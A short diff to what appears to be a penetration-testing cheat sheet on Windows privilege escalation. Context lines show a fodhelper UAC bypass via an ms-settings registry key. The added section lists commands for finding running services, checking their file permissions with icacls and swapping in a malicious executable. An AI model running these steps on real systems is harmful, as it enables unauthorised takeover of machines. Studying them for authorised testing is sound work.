@@ -23,6 +23,14 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 4. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 5. run fodhelper.exe, whoami /groups
 ```
+##### Insecure File Permissions
+```
+1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
+2. icacls "service path"
+3. replace malicious exe with service executable
+4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'"
+5. whoami /priv #check out shutdown privileges of user
+```
 
 ### Linux
 ##### Kernel exploits
